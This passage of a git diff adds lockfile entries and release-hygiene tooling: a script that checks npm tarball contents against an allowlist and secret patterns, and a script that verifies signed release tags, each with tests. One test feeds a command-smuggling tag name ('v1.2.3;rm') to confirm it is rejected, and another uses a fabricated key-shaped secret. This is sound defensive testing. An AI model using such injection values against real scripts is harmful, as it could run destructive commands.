++      lru-cache: 11.5.3
++      minipass: 7.1.3
++      minipass-collect: 2.0.1
++      minipass-flush: 1.0.7
++      minipass-pipeline: 1.2.4
++      p-map: 7.0.8
++      ssri: 14.0.0
++
+   call-bind-apply-helpers@1.0.2:
+     dependencies:
+       es-errors: 1.3.0
+@@ -2657,6 +2917,10 @@ snapshots:
+ 
+   fresh@2.0.0: {}
+ 
++  fs-minipass@3.0.3:
++    dependencies:
++      minipass: 7.1.3
++
+   fsevents@2.3.3:
+     optional: true
+ 
+@@ -2680,6 +2944,12 @@ snapshots:
+       dunder-proto: 1.0.1
+       es-object-atoms: 1.1.2
+ 
++  glob@13.0.6:
++    dependencies:
++      minimatch: 10.2.6
++      minipass: 7.1.3
++      path-scurry: 2.0.2
++
+   gopd@1.2.0: {}
+ 
+   has-symbols@1.1.0: {}
+@@ -2696,6 +2966,8 @@ snapshots:
+     transitivePeerDependencies:
+       - '@noble/hashes'
+ 
++  http-cache-semantics@4.2.0: {}
++
+   http-errors@2.0.1:
+     dependencies:
+       depd: 2.0.0
+@@ -2704,6 +2976,15 @@ snapshots:
+       statuses: 2.0.2
+       toidentifier: 1.0.1
+ 
++  http-proxy-agent@9.1.0:
++    dependencies:
++      agent-base: 9.0.0
++      debug: 4.4.3
++      proxy-agent-negotiate: 1.1.0
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
+   http-proxy@1.18.1:
+     dependencies:
+       eventemitter3: 4.0.7
+@@ -2712,6 +2993,15 @@ snapshots:
+     transitivePeerDependencies:
+       - debug
+ 
++  https-proxy-agent@9.1.0:
++    dependencies:
++      agent-base: 9.0.0
++      debug: 4.4.3
++      proxy-agent-negotiate: 1.1.0
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
+   iconv-lite@0.7.3:
+     dependencies:
+       safer-buffer: 2.1.2
+@@ -2820,6 +3110,24 @@ snapshots:
+     dependencies:
+       '@jridgewell/sourcemap-codec': 1.6.0
+ 
++  make-fetch-happen@16.0.1:
++    dependencies:
++      '@gar/promise-retry': 1.0.3
++      '@npmcli/agent': 5.0.2
++      '@npmcli/redact': 5.0.0
++      cacache: 21.0.1
++      http-cache-semantics: 4.2.0
++      minipass: 7.1.3
++      minipass-fetch: 6.0.0
++      minipass-flush: 1.0.7
++      minipass-pipeline: 1.2.4
++      negotiator: 1.1.0
++      proc-log: 7.0.0
++      ssri: 14.0.0
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
+   math-intrinsics@1.1.0: {}
+ 
+   mdn-data@2.27.1: {}
+@@ -2834,6 +3142,44 @@ snapshots:
+     dependencies:
+       mime-db: 1.54.0
+ 
++  minimatch@10.2.6:
++    dependencies:
++      brace-expansion: 5.0.12
++
++  minipass-collect@2.0.1:
++    dependencies:
++      minipass: 7.1.3
++
++  minipass-fetch@6.0.0:
++    dependencies:
++      minipass: 7.1.3
++      minipass-sized: 2.0.0
++      minizlib: 3.1.0
++    optionalDependencies:
++      iconv-lite: 0.7.3
++
++  minipass-flush@1.0.7:
++    dependencies:
++      minipass: 3.3.6
++
++  minipass-pipeline@1.2.4:
++    dependencies:
++      minipass: 3.3.6
++
++  minipass-sized@2.0.0:
++    dependencies:
++      minipass: 7.1.3
++
++  minipass@3.3.6:
++    dependencies:
++      yallist: 4.0.0
++
++  minipass@7.1.3: {}
++
++  minizlib@3.1.0:
++    dependencies:
++      minipass: 7.1.3
++
+   ms@2.1.3: {}
+ 
+   nanoid@3.3.19: {}
+@@ -2858,6 +3204,8 @@ snapshots:
+     dependencies:
+       wrappy: 1.0.2
+ 
++  p-map@7.0.8: {}
++
+   parse5@8.0.1:
+     dependencies:
+       entities: 8.1.0
+@@ -2866,6 +3214,11 @@ snapshots:
+ 
+   path-key@3.1.1: {}
+ 
++  path-scurry@2.0.2:
++    dependencies:
++      lru-cache: 11.5.3
++      minipass: 7.1.3
++
+   path-to-regexp@8.4.2: {}
+ 
+   picocolors@1.1.1: {}
+@@ -2892,11 +3245,15 @@ snapshots:
+       ansi-styles: 5.2.0
+       react-is: 17.0.2
+ 
++  proc-log@7.0.0: {}
++
+   proxy-addr@2.0.8:
+     dependencies:
+       forwarded: 0.2.0
+       ipaddr.js: 1.9.1
+ 
++  proxy-agent-negotiate@1.1.0: {}
++
+   punycode@2.3.1: {}
+ 
+   qs@6.16.0:
+@@ -3061,8 +3418,39 @@ snapshots:
+       side-channel-map: 1.0.1
+       side-channel-weakmap: 1.0.2
+ 
++  sigstore@5.0.0:
++    dependencies:
++      '@sigstore/bundle': 5.0.0
++      '@sigstore/core': 4.0.1
++      '@sigstore/protobuf-specs': 0.5.2
++      '@sigstore/sign': 5.0.0
++      '@sigstore/tuf': 5.0.0
++      '@sigstore/verify': 4.1.2
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
++  smart-buffer@4.2.0: {}
++
++  socks-proxy-agent@10.1.0:
++    dependencies:
++      agent-base: 9.0.0
++      debug: 4.4.3
++      socks: 2.8.10
++    transitivePeerDependencies:
++      - supports-color
++
++  socks@2.8.10:
++    dependencies:
++      ip-address: 10.7.2
++      smart-buffer: 4.2.0
++
+   source-map-js@1.2.2: {}
+ 
++  ssri@14.0.0:
++    dependencies:
++      minipass: 7.1.3
++
+   statuses@2.0.2: {}
+ 
+   std-env@4.3.0: {}
+@@ -3101,6 +3489,14 @@ snapshots:
+     optionalDependencies:
+       fsevents: 2.3.3
+ 
++  tuf-js@6.0.0:
++    dependencies:
++      '@gar/promise-retry': 1.0.3
++      '@tufjs/models': 5.0.0
++      debug: 4.4.3
++    transitivePeerDependencies:
++      - supports-color
++
+   type-is@2.1.0:
+     dependencies:
+       content-type: 2.1.0
+@@ -3213,6 +3609,8 @@ snapshots:
+ 
+   xmlchars@2.2.0: {}
+ 
++  yallist@4.0.0: {}
++
+   zod-to-json-schema@3.25.2(zod@4.6.5):
+     dependencies:
+       zod: 4.6.5
+diff --git a/scripts/check-pack.mjs b/scripts/check-pack.mjs
+new file mode 100644
+index 0000000..17a1258
+--- /dev/null
++++ b/scripts/check-pack.mjs
+@@ -0,0 +1,75 @@
++import { execFileSync } from "node:child_process";
++import { readFileSync, realpathSync } from "node:fs";
++import { join, resolve } from "node:path";
++import { fileURLToPath } from "node:url";
++import { RULES } from "./check-hygiene.mjs";
++
++// The published tarball holds exactly these files, by pattern. Anything else (sources, source maps,
++// tests, dotfiles, a stray build folder) fails the release before `npm publish` runs.
++export const PACK_ALLOWLIST = [
++  /^package\.json$/,
++  /^README\.md$/,
++  /^LICENSE$/,
++  /^THIRD-PARTY\.md$/,
++  /^release\.json$/,
++  /^npm-shrinkwrap\.json$/,
++  /^bin\/localdot\.mjs$/,
++  /^dist\/(cli|daemon)\.mjs$/,
++  /^dist\/canary-scan\.py$/,
++  /^web\/dist\/index\.html$/,
++  /^web\/dist\/assets\/[A-Za-z0-9_.-]+\.(js|css|woff2|svg|png|webp)$/,
++  /^web\/dist\/assets\/licenses\/[A-Za-z0-9_.@-]+\.txt$/,
++  /^web\/vendor\/selkies\/(index\.html|icon\.png|icon-512\.png|LICENSE|NOTICE\.md)$/,
++  /^web\/vendor\/selkies\/assets\/[A-Za-z0-9_.-]+\.(js|css)$/,
++];
++
++export const MAX_FILE_BYTES = 16 * 1024 * 1024;
++
++// Beyond the repository's hygiene rules: a developer's absolute path (a bundler that inlined
++// import.meta.url, a source map) and an unreplaced build constant.
++export const PACK_RULES = [
++  { name: "developer path", pattern: /\/Volumes\/|\/Users\/[A-Za-z0-9._-]+\// },
++  { name: "unset build constant", pattern: /__LOCALDOT_[A-Z_]+__/ },
++];
++
++export function packFiles(dir) {
++  const out = execFileSync("npm", ["pack", "--dry-run", "--json", "--ignore-scripts"], {
++    cwd: dir,
++    encoding: "utf8",
++    stdio: ["ignore", "pipe", "pipe"],
++  });
++  const [entry] = JSON.parse(out);
++  return entry.files.map((f) => ({ path: f.path, size: f.size }));
++}
++
++export function checkPack(dir, { rules = [...RULES, ...PACK_RULES], files = packFiles(dir) } = {}) {
++  const problems = [];
++  for (const { path, size } of files) {
++    if (!PACK_ALLOWLIST.some((p) => p.test(path))) {
++      problems.push(`${path}: not in the allowlist`);
++      continue;
++    }
++    if (size > MAX_FILE_BYTES) problems.push(`${path}: ${size} bytes is over ${MAX_FILE_BYTES}`);
++    const bytes = readFileSync(join(dir, path));
++    if (bytes.subarray(0, 8000).includes(0)) continue;
++    const text = bytes.toString("utf8");
++    for (const rule of rules) {
++      if (rule.pattern.test(text) || rule.pattern.test(path))
++        problems.push(`${path}: ${rule.name}`);
++    }
++  }
++  for (const required of ["release.json", "npm-shrinkwrap.json"]) {
++    if (!files.some((f) => f.path === required)) problems.push(`${required}: missing`);
++  }
++  return problems;
++}
++
++if (
++  process.argv[1] &&
++  realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))
++) {
++  const dir = resolve(process.argv[2] ?? "apps/cli/pkg");
++  const problems = checkPack(dir);
++  for (const p of problems) console.error(`pack: ${p}`);
++  process.exit(problems.length > 0 ? 1 : 0);
++}
+diff --git a/scripts/check-pack.test.mjs b/scripts/check-pack.test.mjs
+new file mode 100644
+index 0000000..0bf75bc
+--- /dev/null
++++ b/scripts/check-pack.test.mjs
+@@ -0,0 +1,108 @@
++import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
++import { tmpdir } from "node:os";
++import { dirname, join } from "node:path";
++import { describe, expect, it } from "vitest";
++import { checkPack, packFiles } from "./check-pack.mjs";
++
++const FILES = {
++  "package.json": JSON.stringify({
++    name: "localdot",
++    version: "1.0.0",
++    files: ["bin/", "dist/", "web/", "release.json", "THIRD-PARTY.md", "npm-shrinkwrap.json"],
++  }),
++  "README.md": "# localDot\n",
++  LICENSE: "MIT\n",
++  "THIRD-PARTY.md": "# Third-party\n",
++  "release.json": "{}\n",
++  "npm-shrinkwrap.json": "{}\n",
++  "bin/localdot.mjs": "#!/usr/bin/env node\n",
++  "dist/cli.mjs": 'export const teamId = "TESTTEAM01";\n',
++  "dist/daemon.mjs": "export {};\n",
++  "web/dist/index.html": "<!doctype html>\n",
++  "web/dist/assets/index-Ab12.js": "console.log(1);\n",
++  "web/dist/assets/licenses/mediabunny-1.61.0.txt": "Mozilla Public License Version 2.0\n",
++  "web/vendor/selkies/LICENSE": "Mozilla Public License Version 2.0\n",
++  "web/vendor/selkies/NOTICE.md": "# Selkies\n",
++  "web/vendor/selkies/assets/selkies-core-X1.js": "export {};\n",
++};
++
++function pkg(extra = {}, files = FILES) {
++  const dir = mkdtempSync(join(tmpdir(), "local dot's pack-"));
++  for (const [path, text] of Object.entries({ ...files, ...extra })) {
++    mkdirSync(dirname(join(dir, path)), { recursive: true });
++    writeFileSync(join(dir, path), text);
++  }
++  return dir;
++}
++
++describe("the published tarball (Review Focus 4: anything outside the allowlist)", () => {
++  it("passes a package that holds only allowlisted, clean files", () => {
++    const dir = pkg();
++    expect(
++      packFiles(dir)
++        .map((f) => f.path)
++        .sort(),
++    ).toEqual(Object.keys(FILES).sort());
++    expect(checkPack(dir)).toEqual([]);
++  });
++
++  it.each([
++    ["a TypeScript source", "dist/main.ts", "export {};"],
++    ["a source map", "dist/cli.mjs.map", "{}"],
++    ["a test", "dist/cli.test.mjs", ""],
++    ["an env file", "dist/.env", "KEY=1"],
++    ["a stray folder", "web/src/App.tsx", ""],
++    ["a nested dependency", "web/node_modules/x/index.js", ""],
++  ])("fails on %s that npm would pack", (_label, path, text) => {
++    const dir = pkg(
++      { [path]: text },
++      { ...FILES, "package.json": JSON.stringify({ name: "localdot", version: "1.0.0" }) },
++    );
++    const problems = checkPack(dir);
++    expect(
++      packFiles(dir).some((f) => f.path === path),
++      `npm packs ${path}`,
++    ).toBe(true);
++    expect(problems).toContain(`${path}: not in the allowlist`);
++  });
++
++  it("fails on a key-shaped secret, a developer path or an unset build constant in a packed file", () => {
++    const key = ["sk", "proj", "y".repeat(40)].join("-");
++    const dir = pkg({
++      "dist/daemon.mjs": `const k = "${key}";\nconst p = "/Volumes/Disk/Projects/x";\n`,
++      "dist/cli.mjs": `const team = ${["__LOCALDOT", "TEAM_ID__"].join("_")};\n`,
++    });
++    expect(checkPack(dir)).toEqual(
++      expect.arrayContaining([
++        "dist/daemon.mjs: OpenAI-style key",
++        "dist/daemon.mjs: developer path",
++        "dist/cli.mjs: unset build constant",
++      ]),
++    );
++  });
++
++  it("applies the private-name rule to content and paths", () => {
++    const rules = [{ name: "private theme name", pattern: /zzprivatezz/i }];
++    const dir = pkg({
++      "web/dist/assets/zzprivatezz.png": "x",
++      "web/dist/assets/a.js": "ZZPRIVATEZZ",
++    });
++    expect(checkPack(dir, { rules })).toEqual(
++      expect.arrayContaining([
++        "web/dist/assets/zzprivatezz.png: private theme name",
++        "web/dist/assets/a.js: private theme name",
++      ]),
++    );
++  });
++
++  it("fails when release.json or the shrinkwrap is missing, or a file is too large", () => {
++    const { "release.json": _r, "npm-shrinkwrap.json": _s, ...rest } = FILES;
++    expect(checkPack(pkg({}, rest))).toEqual(
++      expect.arrayContaining(["release.json: missing", "npm-shrinkwrap.json: missing"]),
++    );
++    const files = [{ path: "dist/daemon.mjs", size: 17 * 1024 * 1024 }];
++    expect(checkPack(pkg(), { files, rules: [] })[0]).toMatch(
++      /dist\/daemon.mjs: \d+ bytes is over/,
++    );
++  });
++});
+diff --git a/scripts/release/verify-tag.sh b/scripts/release/verify-tag.sh
+new file mode 100755
+index 0000000..4a98655
+--- /dev/null
++++ b/scripts/release/verify-tag.sh
+@@ -0,0 +1,24 @@
++#!/usr/bin/env bash
++# verify-tag.sh <tag>: refuses to release unless <tag> is an annotated tag of the form vX.Y.Z or
++# vX.Y.Z-rc.N, signed with a key listed in .github/allowed_signers, pointing at the checked-out
++# commit, whose version is apps/cli/package.json's. Run from the repository root.
++set -euo pipefail
++
++fail() {
++  echo "release: $*" >&2
++  exit 1
++}
++
++tag="${1:-}"
++[[ "$tag" =~ ^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)(-rc\.(0|[1-9][0-9]*))?$ ]] ||
++  fail "'$tag' is not vX.Y.Z or vX.Y.Z-rc.N"
++[ "$(git cat-file -t "refs/tags/$tag" 2>/dev/null)" = "tag" ] ||
++  fail "$tag is not an annotated tag (a lightweight tag cannot be signed)"
++[ -s .github/allowed_signers ] || fail ".github/allowed_signers is missing"
++git -c gpg.format=ssh -c gpg.ssh.program=ssh-keygen -c gpg.ssh.allowedSignersFile=.github/allowed_signers verify-tag "$tag" >/dev/null 2>&1 ||
++  fail "$tag is not signed by a key in .github/allowed_signers"
++[ "$(git rev-parse "refs/tags/$tag^{commit}")" = "$(git rev-parse HEAD)" ] ||
++  fail "$tag does not point at the checked-out commit"
++version="$(node -p 'require("./apps/cli/package.json").version')"
++[ "v$version" = "$tag" ] || fail "$tag does not match apps/cli/package.json's version $version"
++echo "release: $tag is signed and matches $version"
+diff --git a/scripts/release/verify-tag.test.mjs b/scripts/release/verify-tag.test.mjs
+new file mode 100644
+index 0000000..13e76e6
+--- /dev/null
++++ b/scripts/release/verify-tag.test.mjs
+@@ -0,0 +1,106 @@
++import { execFileSync, spawnSync } from "node:child_process";
++import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
++import { tmpdir } from "node:os";
++import { join } from "node:path";
++import { fileURLToPath } from "node:url";
++import { beforeAll, describe, expect, it } from "vitest";
++
++const SCRIPT = fileURLToPath(new URL("./verify-tag.sh", import.meta.url));
++const run = (cwd, cmd, args, env = {}) =>
++  execFileSync(cmd, args, {
++    cwd,
++    encoding: "utf8",
++    env: { ...process.env, ...env },
++    stdio: ["ignore", "pipe", "pipe"],
++  });
++
++function key(dir, name) {
++  const path = join(dir, name);
++  run(dir, "ssh-keygen", ["-q", "-t", "ed25519", "-N", "", "-C", name, "-f", path]);
++  return { path, pub: readFileSync(`${path}.pub`, "utf8").trim() };
++}
++
++// A repository at version 1.2.3 whose allowed_signers lists the maintainer's key only.
++function repo(version = "1.2.3") {
++  const dir = mkdtempSync(join(tmpdir(), "local dot's release-"));
++  const git = (...args) => run(dir, "git", args);
++  git("init", "-q", "-b", "main");
++  git("config", "user.name", "Release Test");
++  git("config", "user.email", "release@test.invalid");
++  git("config", "gpg.format", "ssh");
++  git("config", "gpg.ssh.program", "ssh-keygen");
++  git("config", "commit.gpgsign", "false");
++  git("config", "tag.gpgsign", "false");
++  mkdirSync(join(dir, "apps", "cli"), { recursive: true });
++  mkdirSync(join(dir, ".github"));
++  writeFileSync(join(dir, "apps", "cli", "package.json"), JSON.stringify({ version }));
++  writeFileSync(
++    join(dir, ".github", "allowed_signers"),
++    `release@test.invalid namespaces="git" ${maintainer.pub}\n`,
++  );
++  git("add", ".");
++  git("commit", "-q", "-m", "chore: release");
++  return { dir, git };
++}
++
++const verify = (dir, tag) => spawnSync("bash", [SCRIPT, tag], { cwd: dir, encoding: "utf8" });
++let maintainer;
++let stranger;
++
++beforeAll(() => {
++  const keys = mkdtempSync(join(tmpdir(), "local dot's keys-"));
++  maintainer = key(keys, "maintainer");
++  stranger = key(keys, "stranger");
++});
++
++describe("verify-tag.sh (signed tags)", () => {
++  it("accepts an annotated tag signed by an allowed key, at HEAD, matching the version", () => {
++    const { dir, git } = repo();
++    git("-c", `user.signingkey=${maintainer.path}`, "tag", "-s", "-m", "v1.2.3", "v1.2.3");
++    const r = verify(dir, "v1.2.3");
++    expect(r.stderr).toBe("");
++    expect(r.status).toBe(0);
++  });
++
++  it.each([
++    [
++      "an unsigned annotated tag",
++      (git) => git("tag", "-a", "-m", "v1.2.3", "v1.2.3"),
++      /not signed/,
++    ],
++    ["a lightweight tag", (git) => git("tag", "v1.2.3"), /not an annotated tag/],
++    [
++      "a tag signed by a stranger",
++      (git) => git("-c", `user.signingkey=${stranger.path}`, "tag", "-s", "-m", "v1.2.3", "v1.2.3"),
++      /not signed by a key/,
++    ],
++  ])("refuses %s", (_label, make, message) => {
++    const { dir, git } = repo();
++    make(git);
++    const r = verify(dir, "v1.2.3");
++    expect(r.status).toBe(1);
++    expect(r.stderr).toMatch(message);
++  });
++
++  it("refuses a signed tag on another commit, or for another version", () => {
++    const { dir, git } = repo();
++    git("-c", `user.signingkey=${maintainer.path}`, "tag", "-s", "-m", "v1.2.3", "v1.2.3");
++    writeFileSync(join(dir, "x"), "x");
++    git("add", "x");
++    git("commit", "-q", "-m", "chore: later");
++    expect(verify(dir, "v1.2.3").stderr).toMatch(/does not point at the checked-out commit/);
++    const other = repo("1.2.4");
++    other.git("-c", `user.signingkey=${maintainer.path}`, "tag", "-s", "-m", "v1.2.3", "v1.2.3");
++    expect(verify(other.dir, "v1.2.3").stderr).toMatch(
++      /does not match apps\/cli\/package.json's version 1.2.4/,
++    );
++  });
++
++  it.each(["1.2.3", "v1.2", "v01.2.3", "v1.2.3-beta", "v1.2.3;rm"])(
++    "refuses the tag name %j",
++    (tag) => {
++      const { dir } = repo();
++      expect(verify(dir, tag).stderr).toMatch(/is not vX.Y.Z/);
++    },
++  );
++});
